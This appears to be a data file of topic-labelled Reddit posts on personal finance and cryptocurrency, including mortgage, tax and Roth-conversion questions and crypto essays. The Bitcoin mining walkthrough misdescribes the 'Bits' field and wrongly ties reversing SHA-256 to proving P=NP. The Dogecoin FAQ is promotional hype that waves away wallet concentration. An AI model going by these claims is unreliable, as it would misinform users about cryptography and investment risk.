**Current $1M Net Worth:**

65% Investments (retirement + taxable)

30% Property (includes house &amp; car)

5% Cash

**Backstory:**

I grew up in a lower middle-class family and lived in trailers most of my childhood. My mom was a single parent to 3 kids at one point, and we always lived paycheck to paycheck.

I was 14 the first time I lived in an actual house when my family was forced to move in with my mom’s new boyfriend because our trailer got repossessed.

The financial struggles I witnessed as a child definitely shaped the way I view money and debt as an adult, for better or worse.

After high school I was so worried about debt that I attended the most affordable community college for my Associate’s. This was the only big thing my mom &amp; step dad paid for ($10k) but I also benefited from them by living at home during those years.

Around the time I finished my Associate’s I took out a car loan for a used Pontiac and took out a student loan to finish my Bachelor’s online. These loans totaled around $17k.

**Career &amp; Income:**

I landed a part-time job at 19 in my career field that paid $16/hour. It absolutely killed me to have debt so I furiously paid my two loans off as quickly as possible after getting my job.

My annual salary was less than $30k during my first 5 years. Entering my 6th year I became full-time which slightly increased my income.

With my relatively low income from my day job I had a burning desire to earn more money so I spent most of my spare time learning about online business, cameras, and videography/editing.

I spent my life savings on a refurbished MacBook to start learning Final Cut Pro. I had to split the transaction across my debit &amp; credit card just to afford the laptop.

I began posting videos online then eventually used my video skills to film weddings so for the past 7 years I’ve been working three jobs: full-time IT job, part-time YouTube, and part-time videography.

**Estimated Gross Income:**

2013: $42k

2014: $73k

2015: $118k

2016: $140k

2017: $135k

2018: $223k

2019: $237k

2020: $251k

**Savings &amp; Investments**

Luckily my day job came with pension and 401k. I started out by automatically contributing 5% to 401k.

Once my self employment income started increasing my CPA suggested I start a SEP IRA which I did 5 years ago.

Not too long after that I started maxing out my 401k at my day job. It was around that same time when I started investing into a taxable brokerage account (mostly boring index funds)

Unfortunately all those years before that I was just saving cash because I didn’t know about investing and was scared to invest.

I used the excuse of “saving for a house” which most of us are told to do by our parents and grandparents.

I missed out on a TON of market gains by not investing sooner than I did.

But in a way I don’t regret the path I took because I was able to meet my wife during that time, and we bought our starter home and paid it off in less than a year.

Looking back it was pretty dumb to pay off the house that quickly when you consider the low interest rate + the stock market performance, but hindsight is always 20/20. Plus I was completely unprepared to be a long term investor (something that the pandemic market crash has turned me into a believer)

Becoming (and staying) completely debt-free is a psychological thing to me. I always wanted to own my home so I could quit my day job anytime if I wanted to and be able to sleep at night knowing I didn’t owe anything to anyone.

I also splurged and paid cash for my dream car which was probably another mistake on paper, but I also looked at it as an investment of sorts and do plan to keep it 10+ years.

Again, being debt-free is probably an irrational ""mindset"" that is burned into my brain from my childhood.

**Looking Ahead:**

Currently my wife and I are debt-free with 7-figures net worth. She quit her day job last year and is working from home as a part time freelancer. We have no kids but plan to try this year.

I plan to keep this setup as long as possible and maximize my income and retirement accounts. I hope to FIRE before 40 with $2M NW.

My next big goal is to be debt-free with $1M invested. I’m aiming to hit that within 2 years.

I feel like being debt-free (including house) with $1M invested is the ultimate life changer for anyone looking to FIRE. I can’t wait to see what that feels like.

**Lessons Learned:**

The basics of becoming a millionaire are simple, but not easy:

1. Maximize income
2. Minimize expenses
3. Invest the difference
4. Wait

Building a side business has been the absolute best thing I’ve ever done to increase my net worth.

Don’t try to be a millionaire overnight. Be consistent. Find your strengths and build a valuable skillset to see if there are viable business opportunities that can benefit from them.

My “success” so far has been a result of these practical steps

* Craft a set of valuable skills
* Work hard in your spare time to create extra income
* Save as much income as possible before spending
* Invest early &amp; regularly

Not having kids has been one of the advantages for me to work so much in my spare time. But that doesn’t mean it’s the “right” way.

A part of me is actually envious of people who had kids earlier in their 20’s because they are still young and have more energy as the kids get older, compared to someone in their 30’s or 40’s.

Also, not rushing into marriage was something that I take for granted. I waited patiently and met my wife in my mid 20’s. Waiting for the right partner makes a huge impact on your NW and FIRE journey.

The reason I work so hard is so I can reach financial independence as soon as possible and quit working at any minute. The irony is that I don’t think I’ll ever stop “working”.

I tried to explain to my wife that Financial Independence is when you can choose to never work again, while you live off of your assets, but it doesn’t mean you HAVE to stop working. It’s more about the FREEDOM to do whatever you want with your time. I don’t want to wait until I’m 60 to have that freedom.

Set realistic short-term goals that you can easily track. Keep It Simple, Stupid. I regularly tell myself this phrase. Simplicity is underrated. If you want to lose weight, it’s simple: move more, eat less. The same applies to net worth: make more, spend less, and invest.

Have an “abundance” mindset. There’s an abundance of opportunities, once you start looking. There’s an abundance of people you can meet to increase your worth, once you get out of your comfort zone. There’s an abundance of time, once you start being intentional with your hours.

You still need to sacrifice. Instant gratification is your biggest enemy. Being able to wait years for results is unfathomable to the average person. Not bingeing the latest TV show is hard. Stoicism is a great way to stave off instant gratification &amp; learn self discipline.

Have a routine. Building productive habits that allow you to get into deep focused work is an invaluable tool.

Live below your means as much as possible, but spend lavishly on things you deeply care about. I bought a modest house 5 years ago for under $200,000. The main reason I bought it? So I could have a garage for my $50,000 Tesla.

Life is short. Don’t let money run it. My wife &amp; I decided we love to grow our own veggies &amp; herbs to save money on groceries. But we will gladly spend thousands on a trip to Switzerland, Italy, and Scotland. Find what's important to you and don't feel ashamed about it.

Time and health are your most valuable assets in life. It’s okay to be selfish with these two things.

Finally, there's no absolute right way to go about becoming a millionaire. Like with all things in life, it's the journey that you'll remember.",finance
CryptoCurrency,The risks of emergent centralization,"Being cryptocurrency enthusiasts, I imagine that we're all pretty enthusiastic about the idea of ""decentralizing"" currency and finance. Whether it's a considered political position or just a natural distrust of ""authority"", I imagine many of us were drawn to crypto because of the promise of a currency or economic infrastructure that wasn't obviously controlled either by States, central banks, or big corporations. Part of the genius of the original Bitcoin whitepaper was that it created a robust structure that didn't need to rely on a central authority. 

There is an issue, however, that *should* be on the mind of every decentralization-minded crypto-enthusiest but I see rarely discussed outside of a few more niche communities:

*Emergent centralization.* 

Almost every coin (with the possible exception of VET) is built in such a way that there is no default controller of the network. There's no corporate charter, no CEO, owner, or state regulator. However, almost every coin is structured in such a way that it will allow centralization to emerge spontaneously over time, and I would argue that this emergent centralization is *just as dangerous and worrying* as the kind of ""top down"" centralization crypto was initially built to get away from. 

This is particularly alarming in Proof of Stake systems, where the wealth someone is able to stake on the network both increases their ""political"" power in the network (in the sense of voting/validation power), as well as increasing the chance that they will be able to gain even more money through fees gathered when the PoS protocol is executed.

This phenomena is ubiquitous in the natural world and is called a ""rich get richer"" process (mathematicians call it [preferential attachment](https://en.wikipedia.org/wiki/Preferential_attachment) and the resulting inequalities are said to be ""[heavy-tailed](https://en.wikipedia.org/wiki/Long_tail)"" or ""[scale-free](https://en.wikipedia.org/wiki/Power_law)"", depending on the statistical specifics). 

The reason that this should be on our minds is that emergent centralization and heavy-tailed dynamics *run the risk of reproducing all of the issues that cryptocurrencies are meant to solve.*

There have already been a few instances where emergent centralization had adverse effects on the overall market health. For example, it is well-known that whales can drastically influence the price just by choosing when, and how much, of their wealth they want to dump. Pressures that drive emergent centralization *will inevitably* produce ultra-wealth people or groups with the power to manipulate the market by enacting their own idiosyncratic ""monetary policy"" by using immense wealth to control the amount of available currency.

Another example is Chinese Bitcoin mining pools, which are able to influence the price by selling, or holding newly mind Bitcoins (and of course, the Chinese government, which controls access to the electricity needed to mine has a ""back-door"" into the market. 

We should ask ourselves: why are we opposed to centralization? I know for me it's not just a distrust of governments of big banks specifically, it's a broader principle: *I don't want anyone, be it a bank, government, or successful entrepreneur to be able to exert control over me and my wealth*.  *I want to remain as fully autonomous as humanly possible.*"" The crypto community has done a great job detailing why it's bad for banks or governments to exert control. But we should remain vigilant that *no one* is able to take control of the new dual power system emerging here.  

With the possible exception of Nano (which remains down in the +100s coin rankings), this conversation appears to be completely absent from both mainstream and development circles. It may be that many crypto enthusiasts are actually very in-favor of emergent centralization in that they hope they will end up being the ones at the center with the wealth and power, but the danger to the system as a whole should be obvious.",cryptocurrency
personalfinance,How do I update my W4 to get $200 per paycheck back?,"Hi everyone, I recently switched jobs. Up until now, I have been getting no more than $200 back in tax returns at the end of the year, which is how I like it. However, with this new job (30% higher salary), I am now getting over $5000 back on my tax return despite using the same W4. I have done the math several times, and the culprit is that my federal tax withholding is ~$200 a paycheck too high (I get paid every 14 days), which amounts to roughly 5% too much. 

I have entered my information into the IRS tax calculator tool and it agrees that I am getting over $5000 too much withheld per year. I tried using their W4 adjustment tool and the results just simply do not make sense to me. Initially, it suggested that I put $1500 into box 3 on the W4. 

First off, why would I claim anything in the “claim dependents” section? Is it even legal to manipulate your w4 into the correct withholding if you do not actually meet the requirements (I.e. claiming extra dependents or deductions)? I do not have any dependents, so wouldn’t this be lying? Second, how do they figure that putting $1500 here will give me $200 per paycheck? Nonetheless, I tried this out earlier this year, but it only changed my paycheck by $60, which is helpful, but still not even 1/3 of what I need back. 

Just as a note, my taxes are straightforward. I do not receive a taxable bonus, other income, have tax deferred 401k contributions, etc. I also use the standard W4 form and usually claim 1 for myself and nothing else.

TLDR; I simply want to know the CORRECT way to update my W4 to withhold $200 less per paycheck.",finance
CryptoCurrency,Could the US Federal Government outlaw crypto currency with administrative action? Or would it require actual legislation?,"I was curious if anyone in this community has toyed with idea of just how exactly the US Federal government might outlaw crypto currency. 

Obviously a law would do it, but it would be far easier with some administrative action by a federal agency.

I know a number of agency heads have warned to expect further regulation, but does any one have any idea which agency is the most likely, or perhaps most effective, in prohibiting crypto? Would have to be done with agency cooperation? Or maybe a number of agencies would make it so difficult that cryptos just become too cumbersome?",cryptocurrency
personalfinance,Mortgage refinance: question about appraisal/inspection,"Throwaway account, and trying really hard to keep this short! Otherwise I'd be typing my whole life story here...

TLDR: if a lender requires an appraisal and/or inspection for a refinance, what are they looking for: that the house is worth at least the value of the refinanced amount? Or do they want a house that’s nearer to market value?

I want to refinance approximately $135,000 left on my mortgage, because my current rate is outrageous. The house is 131 years old and needs work—interior, exterior, structure, systems. We’re not doing anything but the most critical repairs because the long-term goal is to keep the land but tear down and rebuild the house. There are no plans to sell.

It’s an HCOL area that’s about to explode with development so even with scuffed floors, old windows, inadequate closets, and a wet basement, the house and land are worth much more than the $135K I need.

But an inspection is likely to turn up surprises, possibly major. Could there be any risk that I’d find myself somehow required to make a bunch of upgrades and repairs, just by applying to refinance? The mortgage calculator shows exactly how much money is saved over the years with a new rate, but I could also spend that entire amount on renovations in the next six months...which I don't want to do on a building I plan to destroy.",finance
CryptoCurrency,Are huge mining farms the enemy of DeFi?,"Large corporations have a way of taking a cool or disruptive innovation, making it bigger and more corporate, and eventually ruining the features that made it awesome to begin with. 

Social media went from sharing simple personal anecdotes and connecting friends to data mining and profiling to keep you engaged and seeing advertisements.  Search engines moved from helping you find what _you_ want to helping companies feed you content _they_ want. Cool innovations have been bought out and shelved by competitors to protect their profit. 

It’s a pattern: more corporate involvement eventually means less benefit to the average person.  When I see news about large Bitcoin mining operations being set up by well-funded corporations I wonder - is the beginning of the same process? 

Once a few million - or billion - dollars have been sunk into any project, the investors will also do what they must to protect that investment. That means fighting off competitors and resisting any change that would put their investment at risk. 

If I’m right, when you see an up-and-coming altcoin that could kill the profit margin of Bitcoin miners, you should expect it to be attacked.  If the mining companies get too large we might even see a loss of the decentralization - not just in blockchain, but in decision making - that makes Bitcoin disruptive and unique to begin with. 

TL;DR: Can DeFi stay profitable (and enjoyable!)  for average players or will the billion-dollar whales and mining operations eventually become The Fed of Bitcoin and kill off the rest?",cryptocurrency

personalfinance,Covert Traditional to Roth IRA &amp; IRS Tax Payment Plan,"Good Afternoon Everyone!   


I don't post much, but have recently had a overwhelming sense of mortality and been wanting to get my finances in order. I have just rolled over all of my 401ks from various employers into a single traditional IRA and I am contemplating trying to convert it over to a Roth IRA. I know for a fact because of my health issues I won't be able to make it to retirement age and would like to try and retire by 40-50 at the latest hence why the need for a Roth IRA. The total traditional IRA account is about 120k and from my understanding to convert it the only ""fees"" I would pay is the entire balance would be marked as income and I would have to pay income tax on it which at my tax rate (\~35%) is about 42k which is not something I can reasonable pay back in 1 year so I would have to either deduct it from the traditional IRA paying an additional 15% early withdrawal fee on top of the 40k. I am wondering, however, if there is another option. From my research it appears that I should be able to setup a payment plan with the IRS to pay the sum over a multi-year period with about a 0.25% interest rate. Since this is my first time ever having to setup a payment plan I shouldn't have to pay any fees or penalties outside of the interest rate. Over 20 year difference following the S&amp;P average of \~11.72% since 1988 I am looking at a nearly 500k difference with that 40k in the account &amp; paying the IRS vs taking the 40k loss in the account balance.

CryptoCurrency,An example of how Bitcoin mining works,"This post is for anyone interested in the details of the mining process of Bitcoin. It doesn't dive into transactions, but it will show how a new block is mined using an existing block that was already mined on the blockchain.

So I'll dive right into the example:

Bitcoin currently has about 680,000 blocks mined. I chose block #679,129 for this example.

These are the main components of the block:


|Name|Value|
:--|:--|
|Version|939515904|
|Previous Block Hash|00000000000000000000dcfe84db5a89c3b9247f21467f2ff8c0a723c9d9b054|
|Merkle Root|cabba7687aac8de36e8a821cdf2830bc3e1bcf5664dae459ad0be8f7174c392b|
|Timestamp|2021-04-14T03:01:51Z|
|Bits|386673224|
|Nonce|3683156163|
|Block Hash|00000000000000000001328850b0482312325f7f4abd5457e45d37cad664675d|

Just to explain the block values a little, all of these values contribute to the mining of the block, it is the essence of the block. The version is the blockchain protocol software version. The timestamp is the current time (when the block was being mined). Bits are subunits to represent BTC as bits. Then we have hashes (sha256 hashes to be exact) for transactions and linking to other blocks. 

Each block gets a hash (an encoding) which starts with a series of 0's like you see in ""Previous Block Hash"" and ""Block Hash"". The goal of mining is to calculate the Block Hash before others containing a number of zeros at the start of the hash. Technically, the hash can be thought of as a big number, and really the miners are looking for a number less than a certain difficulty (which is adjusted to make mining more difficult if there's a lot of miners, so you have to find an even smaller hash/more zeros if the blocks are being mined too quickly). For example, if the difficulty is set to 000200, then we want to find a hash less than 200, so 000300 would be invalid even if it contains three 0's, but 000199 would be valid since it's less than the difficulty. The hash just contains extra numbers like a, b, c, d, e and f which is hexadecimal / base 16. So we count in groups of 16 instead of groups of 10, so from 1-9 is normal, but a=10, b=11, c=12, d=13, e=14, f=15 and at 16 we represent it as 10. Then 11 (hex) = 16 + 1 (decimal), 12 (hex) = 16 + 2 (decimal) etc. I'll explain how we find this hash with the example block a little later. 

So the current block connects to the previous block using the ""Previous Block Hash"" (think of this like the link of the block ""chain"" connecting this block to the prior block). Then we have a merkle root which encompasses all transactions encoded into a hash. The merkle root is built by converting all of the transactions into hashes and adding them into a merkle tree, you can read more on this here: [Calculating the Merkle Root for a block](https://bitcoindev.network/calculating-the-merkle-root-for-a-block/). 

Finally we have the nonce. The nonce is like the golden ticket, you win 6.25 BTC if you find this value for a given block before other miners. You also will all of the transaction fees as an incentive to include transactions in your blocks (otherwise what's point of doing extra work when I can get 6.25 BTC for doing nothing?). The transactions are all bundled into the merkle root, so we don't have to worry about them for this example.

How a miner prepares the block: First we need to convert all of its contents to hex values (the hashes are already hex, remember they're just big numbers!).


|Name|Hex Value|
:--|:--|
|Version|37ffe000|
|Previous Block Hash|00000000000000000000dcfe84db5a89c3b9247f21467f2ff8c0a723c9d9b054|
|Merkle Root|cabba7687aac8de36e8a821cdf2830bc3e1bcf5664dae459ad0be8f7174c392b|
|Timestamp|60765b1f|
|Bits|170c2a48|
|Nonce|db8880c3|


All of this was just a simple decimal to hex conversion. You might be wondering what happened to the timestamp. It first gets converted to the number of seconds since 'January 1, 1970, 00:00:00 UTC' then we convert the seconds (decimal value) to hex. This is just the start time for computers to keep track of time in clocks.

Now the block goes through this ""reverse and swap"" process. So each value gets reversed (so if the value was 1234, now it becomes 4321). Then we swap pairs all the way down. So the initial value of 1234 was reversed to 4321 and finally the pairs are swapped as 3412. You can also think of it as one step where we reverse the  values but as pairs, so if we had 123456, we then have the pairs |12|34|56| and we reverse the pairs: |56|34|12|.

How the block looks now after a reverse and swap:

|Name|Hex Value reverse and swap|
:--|:--|
|Version|00e0ff37|
|Previous Block Hash|54b0d9c923a7c0f82f7f46217f24b9c3895adb84fedc00000000000000000000|
|Merkle Root|2b394c17f7e80bad59e4da6456cf1b3ebc3028df1c828a6ee38dac7a68a7bbca|
|Timestamp|1f5b7660|
|Bits|482a0c17|
|Nonce|c38088db|


Now we simply concatenate everything into one long number in the order of Version + Previous block + merkle root + timestamp + bits + nonce. For a simple example, if version was 123 and previous block was 678, then we concatenate them to 123678. 

Here is the concatenation of our block, called the header of the block (this is everything in the block):

00e0ff3754b0d9c923a7c0f82f7f46217f24b9c3895adb84fedc000000000000000000002b394c17f7e80bad59e4da6456cf1b3ebc3028df1c828a6ee38dac7a68a7bbca1f5b7660482a0c17c38088db


Now we hash the block using sha256 which is a one way algorithm to convert a value to an encoding but cannot be reversed without incredible difficulty. BTC relies on this hashing algorithm to secure the network on top of the miners competing to find the nonce. In software/compute science, if you could reverse this algorithm efficiently, you could prove that P = NP which is a fancy term for the world burning. It means that there are incredibly difficult problems that we can't solved efficiently, but also can't prove whether it's possible to solve them efficiently. Even coming up with the proof for whether the difficult problems could be solved efficiently has been shown to be part of the difficult problems. Most of the world relies on the fact that these difficult problems will never be solved (especially for cryptography for passwords and your BTC funds). It can also could be used for many things, for example converting your funds from one fiat to another always guaranteeing you make a profit (infinite money!) since they would have the solution to the traveling salesman problem. So if someone could reverse sha256, then they could do a lot more harm to the world than just breaking BTC. 

Anyways, we put the header into the sha256 algorithm, which results in this value:

cf9a2c5fd2549ddc43c7cc592a892b3f106e9cfbb3114150ca16ec4533267b28

Then we put that value into the sha256 algorithm again which results in this value (yes BTC double hashes):

5d6764d6ca375de45754bd4a7f5f32122348b050883201000000000000000000

Notice that the end of the encoding it has several 0's. This is because the last step to mining is to reverse and swap again! So we get the final hash as:

00000000000000000001328850b0482312325f7f4abd5457e45d37cad664675d

And that's it. The block was mined. Miners will do this process over and over with several computers to try different Nonce values until they find the specific nonce to generate a hash small enough for the difficulty. This nonce was 3,683,156,163 which is billions of nonces to try for just a single block and 10 minutes time before the rest of the miners figure out the right nonce for the hash. There's no algorithm to find the nonce efficiently, so trying values 0, 1, 2, 3, 4, etc is no different than any other approach. The only difference could be that other miners are starting at 0 too, so unless you're faster than them, then maybe you want to try other starting points or random values.",cryptocurrency

I'm a new partner at a regional law firm in LCOL flyover country (think middle of the US). I have two young early elementary kids. My wife and I are in our early/mid 30s. We want to move to the side of town their school is on. We currently commute 25 minutes to school on a toll road (spending approx. $150 a month on tolls). We are looking at wooded 10 acre lots in an area with rolling hills in a neighborhood near their school and building our dream home. Around here, wooded lots are a rarity. I grew up living in a wooded area in a different state and my best childhood memories are playing and exploring out there.

I have a current gross base salary of $144,000. After taxes and retirement contributions (about 10% of gross, not maxing 401Ks, but close), I net around $7,850 a month. I also receive a annual profit contribution/bonus that is around $116,000. Total gross annual income is around $260k. After taxes and mandatory profit sharing plan contributions, kids' school tuition/savings, and donations, the bonus nets around $31,000. While things happen, my job stability is solid and it's more likely than not that total gross annual income could be around $350k per year in the next five to ten years. My wife doesn't work professionally but is looking for part time work with school hours.

We are budgeting $650k to $700k total to build, including land, building costs, and site work. Side note-with current lumber and material prices, I know that may be a pipe dream for quality construction, but it fits some rough estimate we have. We can put $50k down now for a construction loan plus an additional $15k for closing costs, moving costs, etc. I found a reputable bank here that provides mortgages to certain professions for up to $1M without anything down and no PMI. They also only have a $1,000 closing/origination fee. They allow you to pay taxes and insurance outside of escrow in case we want to pay those on an annual basis on not in our monthly payment. These terms are the same for a home purchase or a construction contract.

The interest rates, however, are slightly higher. They offer a 30 year 15/1 ARM (I don't have the total max interest increase or max annual increase) for roughly 3.7% and a 30 year fixed for around 4.0%.

What your thoughts are on a 15/1 ARM (which seem to be an unusual term for an ARM) vs. a 30 year fixed?

Depending on the rate, I anticipate that P&amp;I will be about $3,100 a month, taxes will be around $7,000 a year, insurance will be around $3,000 a year (hail and tornados drive up the price here compared to some places), and HOA fees of $65 a month. Depending on final interest rates and construction budget, all housing expenses would be between $3,600 and $4,100 monthly, or 35% to 45% of net monthly income. Unless my math is wrong, we could keep about the same standard of living, but nearly all of the net bonus would go towards property taxes, insurance, and HOA (assuming we do not put it in escrow). Right now, we primarily save the bonus in a HYS account.

How does that compare to what a normal percent of net pay is or would be comfortable with? I know lenders use gross pay to determine affordability, but I don't think that's the most accurate picture of what one can truly afford.

Our current home is nice, but very much a cookie-cutter house in a normal suburban neighborhood on a very small lot. Our current housing expense are $1,550. Based on the current market, we have about $75k in equity in it after commissions, repairs, and closing costs. We would replenish our savings with the sale proceeds.

Unless the market slows down, we would put it on the market a few months before construction is completed. Currently, houses are on the market in our area for around 3 days on average. However, we may need a HELOC available for emergency funds and to pay interest payments on a construction loan if they get sizeable after more draws are taken out. the other option is to sell relatively soon and then rent for several months. We can get a decent rental for about what we pay now, maybe closer to $2k a month.

We have no debt other than our mortgage. Both cars are paid off, but we may need another one in a couple years (I would aim to outright buy a good gas mileage, daily driver car for $10-$15k in cash so there would be no additional monthly payment). Our monthly expenses range from around $3k to $6k a month. That includes donations (we like to donate around 10% of our income per month), medical bills, groceries, cell phone, utilities, clothing, entertainment, gifts, maintenance, additional savings, small vacations/trips, etc. We watch our spending, but do not currently have a strict budget.

The other option we have talked about is paying off our house in a couple years. The idea is that we would invest the amount we currently put in the mortgage and also invest the bonus. Rounding up, in two years if income stays the same, we'd have about $50k a year to invest, not including normal retirement contributions.

What's a reasonable rate of return on investing $50k each year over a ten year period?

Foregoing our dream home may mean having true financial independence and being able to retire much earlier at a good standard of living. However, we miss out on what we want now and, I'm not sure what I would do with myself even if I could retire in my late 40s or early 50s. That is on the opposite spectrum of having a large mortgage in the location we want, but it worth considering what we might be giving up.

TLDR:  I want to know thoughts on how much is a normal amount to spend on housing, whether a 15/1 ARM is worth a lower interest rate, and what the financial trade off is with living in a moderate house to build financial independence vs. building a dream home now.",finance

I want to start off with two of the main misconceptions I’ve seen in the past few weeks. 

1. Question: Dogecoin was created a joke/meme, how can people realistically take something created as joke seriously? 

Answer: 
There are plenty of examples of a product, idea, or technology being created with one intention, and then growing and evolving into another.

Parody’s are a perfect example of this. In fact, one could consider Dogecoin to be a parody of bitcoin/Litecoin. Just because something is a parody or joke does not take away the quality of what has been created. There are plenty of examples where parody’s out grew in popularity or, in fact, were better than the original. 

Dogecoin was created In 2013 and has survived 8 years which is WAY longer than 99% of other cryptocurrency that die out in 1-2 years or less. It’s had 8 years to develop as well an active development team working on making improvements right now. The code is being updated all the time and you can check the code on GitHub. 

Bitcoin was created to be used as exchange of goods and services - yet 60% of all bitcoin haven’t been spent in over a year. Is bitcoin a failure because it’s terrible at was it was CREATED for? No. It’s utility changed. Which is okay. Just because something was created for one thing, does not mean it’s use cannot change. The meme aspect of Dogecoin absolutely zero impact on its functionality as a legitimate cryptocurrency. It’s literally just the name. Ironically enough, the fact that the creator named the cryptocurrency after the doge meme is actually HELPFUL to its success. Cryptocurrency has notoriously been a complicated subject; by embracing novelty and giving Dogecoin a name that is easily recognizable to the general population actually allows for dogecoin to be a great entry point for new comers into cryptocurrency. 

We have all witnessed the power of a meme, the depths it can reach in society, especially in recent years. We have seen it many times before with video games, consoles, Oreos, or as of late even toilet paper... A meme has inherent value in the form of “widespread information”. A meme can spread an idea across diverse communities, and even entire countries literally overnight. This can bring about lasting effects on culture and society. If correctly taken advantage of, Doge can become the dominant meme currency of the internet, and amass real-world value just by being a popular, recognisable meme itself. This is where the saying “Dogecoin is the people’s coin” comes from. This is marketing 101. If your idea, or product is too complicated or not enough people know about then it doesn’t matter how technologically sound it is. Dogecoin have the best technology? No. Can it be improved upon. Definitely. In fact, the original developers have started working on the project again. An analogy I like to use is this. McDonald’s makes hamburgers. They have a clown as a mascot. A literal personification of a joke. Does make McDonald’s make the best hamburgers? No. Does McDonald’s have “value” in their industry? Undeniably so. So what does McDonald’s do correctly? They provide a cheap, easily accessible, and brand able product to the masses. Which is what dogecoin does for cryptocurrency. 

2. Question: is Dogecoin a shitcoin? What is a shitcoin and why are people calling Dogecoin one?

Answer: shitcoin is a term r/cryptocurrency created to describe a cryptocurrency with little to no value or digital currency that has no immediate, discernable purpose. The term is often used to describe altcoins or cryptocurrencies developed after bitcoins became popular. 

There are literally thousands of shitcoins. There are approximately 4,000 Cryptocurrencies in existence and pretty much anything outside of the top 30 are indeed, shitcoins. 

Dogecoin is not one of those shitcoins.

The people who say dogecoin is a shitcoin have done absolutely zero research, or if they have are misinformed. Most of the time they are just repeating some BS they heard on Twitter or Reddit without checking if what they’re saying is true. Pretty much every misconception about Dogecoin has been to over wrong. (I am going to discuss these misconceptions in detail below) Dogecoin may appear at first glance as just a joke or a meme, and therefore valueless due to its name. However, the name aspect of Dogecoin has absolutely zero impact on its viability as a cryptocurrency. Dogecoin actually has great utility (usefulness) to be used for exchange of goods and services. 

Some people will never take it seriously.  That's just the facts of it. DOGE is the ""crypto"" of cryptocurrencies in that none of the ""boomers"" believe in it but it's just steadily chugging along, gaining value.  10 years from now maybe they'll pull a Peter Schiff and be like I guess I was wrong or they'll still be cursing it. It doesn’t change the fact that Dogecoin is successful, has value and useful at Cryptocurrencies intended purpose to exchange goods and services. It's accepted as a method at payment at more places than 99.9% of cryptocurrencies.  That should be all the validation you need.  It's the Official Joke Coin and people can hate but it's official status will keep it around and always in the picture. 

3. Question: Why Dogecoin? What is Dogecoin useful for? What is its utility 

Answer: For the Lolz. Well, not quite. Initially as a purely meme-driven alternative to the likes of Bitcoin and Litecoin, Dogecoin in-fact boasts very low transaction fees and fast transaction times, very little network congestion, and most importantly, is designed to be used as a daily means of exchange, like your morning cup of coffee. Also, it is really fun, and who doesn't like the Dog ?!
		
Think of it like this: to exchange goods and services without currency, one must barter. I can barter a service (a haircut, for example) towards someone who needs a haircut, and in exchange they can barter a good or service to me.Currency then becomes an ""IOU"" (I Owe yoU) so that, if somebody needs me to cut their hair, they can give me an IOU for a good or service they control. When enough people begin adopting this, a centralized currency eventually takes hold. Crypto seeks to take this a step further and, instead of relying on building up a centalization in terms of valuable metals or debt, it is built up solely on the exchange of goods and services. Dogecoin, compared to other cryptocurrencies, finds itself in a strange position where the origins did NOT see it soaring to the moon in any situation. Funny how things can change in time. Dogecoin has pros and cons to it. Comparing it to other cryptos, it does not face a supply cap like Bitcoin does. It is not a directly equated asset, such as how Bitcoin can be attributed as a digital gold asset. Mining dogecoin is also much simpler (comparitively) and does not face difficulty spikes, a source of Bitcoin slow-down. It however, does indeed have a purpose and is beeyb

4. Question: Places to buy dogecoin places where you can spend Dogecoin? 

Answer: Refer to r/dogecoin posts by the moderators for a list of businesses that accept doge as payment. 

5. Question: Difference between cold storage, internet wallets and Robinhood/exchanges

Answer: 
Coldstorage - in the cryptocurrency world cold storage refers to physical objects/devices that contain your cryptocurrency. 

Wallets are an electronic program of service that stores your cryptocurrency. There a number of different wallets - but I personally use Dogecoin.info

Exchanges - an exchange is a company that holds a large sum of cryptocurrency - this case Dogecoin. They exchange fiat currency (paper money) for cryptocurrency. When you have your money on an exchange it is in the custody of the exchanges wallet until you transfer it to your personal wallet. Through legally binding user agreements you do technically own the coins, however in order to use your cryptocurrency you need to have it in your personal wallet. The same way you can’t use money in the bank - you have to cash out by withdrawing your money. Certain exchanges allow withdraw - others do not. Robhinhood currently doesn’t allow withdraws, but they are working on making this happen. 

If you would like to help increase the speed at which Robhinhood adds their withdraw feature read my article here:

6. Question: Does Dogecoin have value? How does Dogecoin increase in price or decrease in price? 

Answer: Yes. Dogecoin has value. If didn’t have value then it wouldn’t be bought or sold at all. Anything can have value as long as enough people assign it value and agree to it. The value of any means of exchange is fundamentally driven by supply and demand. If two parties agree that X amount of asset A is roughly worth the same as Y amount of asset B, you effectively have established a market.  That’s why the US dollar and other fiat currency has value even though it just a piece of paper. The difference between fiat currency and cryptocurrency is that fiat currency is determined by centralized government and other underlying economical/market conditions. Cryptocurrency is meant to be a decentralized form of fiat currency. Now as to why the price changes from say .05 to .06 (random numbers using this as an example for explanation purposes. It is not exact) this value is driven primarily by supply and demand. We already know the supply of Dogecoin, so for the purpose of this the main driving factor in the change in price is demand. But the demand for Dogecoin isn’t just one person. It’s the entire group of people who own Dogecoin. So if at any given time lets say 10 people with 1000 Dogecoin want to sell. But only 5 people want to buy 1000 Dogecoin. This means that the sellers “value” Dogecoin less at its current price than buyers do. 5000 Dogecoin less. This changes to price from .05 to .049. The same applies if more people wanted to buy. Then the price would go from .05 to .051. An algorithm repeats the process over and over constantly updating the price. However that’s only one way to change the value. The best way to increase the overall value of the currency in the long run is by eventually by exchanging your coins for goods, services, or just by tipping and trading with other Dogecoin holders. This gives Dogecoin utility. Which basically means that it can be used for something other than just buying Dogecoin at a certain price and selling it another. That is why you see people pushing to accept Dogecoin as payment. If legitimatize Dogecoin as a cryptocurrency and currency when companies allow you to exchange it for goods and services. As the value of Dogecoin rises, more and more businesses will recognise its potential and importance, and subsequently begin to accept it in exchange for goods and services. This will also help to grow the overall value as well as developer community around Dogecoin.

7. Question: Circulation of currencies. The importance of buying, selling, and holding - and the differences between them. 
		
Answer: To briefly explain this, a lot of people have been saying “buy and hold” or “I’m never selling!” - which in itself is great start. But there remains a lot of misinformation around the topic, for example that simply ""buying and holding Doge"" will drive up the price indefinitely. Unfortunately, that is just not true. Buying, holding, and selling are all intricately connected with each other. ALL of those three states are essential for a (digital) currency to flourish. Holding does neither hurt or raise the value of the asset, but rather it helps to establish a baseline, which is also called ""setting a floor"". Those who have diligently kept on holding their coins, have allowed Dogecoin to stabilize at its current price point. Remember, this remains a huge gain from where Dogecoin has been just months ago. An active circulation of a currency is critical to establishing it as an effective means of exchanging goods and setting it up for long term growth.

8. Question - 100 people own the top wallets which account for 65% of the total supply of Dogecoin. How can Dogecoin be a decentralized currency or a solid investment if 100 can negatively impact the market
Answer: 
The people who say this are just repeating what they’ve heard from someone else without doing research. They are trying to spread fear, uncertainty and doubt or they just don’t realize what they are saying is misinformation. 

